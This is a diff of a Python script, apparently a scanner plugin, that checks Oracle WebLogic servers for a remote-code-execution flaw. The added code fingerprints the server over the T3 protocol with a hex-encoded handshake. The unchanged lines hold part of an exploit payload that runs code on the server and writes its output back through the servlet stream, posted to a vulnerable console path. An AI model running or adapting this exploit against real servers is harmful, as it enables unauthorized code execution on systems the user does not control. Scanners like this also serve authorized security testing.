@@ -1,8 +1,33 @@
 import requests
 import urllib, re
+import socket, time
+from urllib.parse import urlparse
 import http.client
 http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
 
+def weblogic_fingerprint(url):          # weblogic版本指纹
+    oH = urlparse(url)
+    a = oH.netloc.split(':')
+    port = 80
+    if 2 == len(a):
+        port = a[1]
+    elif 'https' in oH.scheme:
+        port = 443
+    host = a[0]
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(3)
+    server_address = (str(host), int(port))
+    sock.connect(server_address)
+    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
+    time.sleep(1)
+    try:
+        version = (re.findall(r'HELO:(.*?).false', sock.recv(1024).decode()))[0]
+        if version:
+            return True
+        else:
+            return False
+    except:
+        return False
 
 def verify(url):
     relsult = {
@@ -36,6 +61,8 @@ def verify(url):
               'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
               'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
     try:
+        if weblogic_fingerprint(url) is not True:
+            return relsult
         vulurl = urllib.parse.urljoin(url, path)
         req = requests.post(vulurl, data=payload, headers=headers, timeout=5, verify=False)
         if re.search('excvasqweqqwqwaasasdasdasd', req.text) and re.search('echo', req.text) is not True:
